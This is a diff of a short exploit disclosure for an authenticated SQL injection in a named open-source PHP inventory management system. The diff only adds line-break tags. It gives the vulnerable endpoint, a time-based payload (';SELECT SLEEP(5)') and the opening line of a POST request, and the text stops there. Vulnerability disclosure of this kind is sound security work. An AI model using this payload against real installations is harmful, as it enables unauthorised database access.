@@ -1,15 +1,15 @@
 ﻿
-**Exploit Title:** Free and Open Source inventory management system php - Authenticated SQL Injection
-**Date**: 4/08/2023
-**Exploit Author:** y3thu
-**Vendor Homepage:** https://www.sourcecodester.com/users/mayurik
-**Software Link:** https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html
-**Attack Vector:** WEB, Network
-**Testeted on:** Windows 10  using XAMPP
+**Exploit Title:** Free and Open Source inventory management system php - Authenticated SQL Injection <br>
+**Date**: 4/08/2023 <br>
+**Exploit Author:** y3thu <br>
+**Vendor Homepage:** https://www.sourcecodester.com/users/mayurik <br>
+**Software Link:** https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html <br>
+**Attack Vector:** WEB, Network <br>
+**Testeted on:** Windows 10  using XAMPP <br>
 
-**POST Authenticated SQL Injection**
-**POC**
-**payload:** `;SELECT SLEEP(5)`
+**POST Authenticated SQL Injection** <br>
+**POC** <br>
+**payload:** `;SELECT SLEEP(5)` <br>
 
 
     POST /ample/app/ajax/catagory_data.php HTTP/1.1
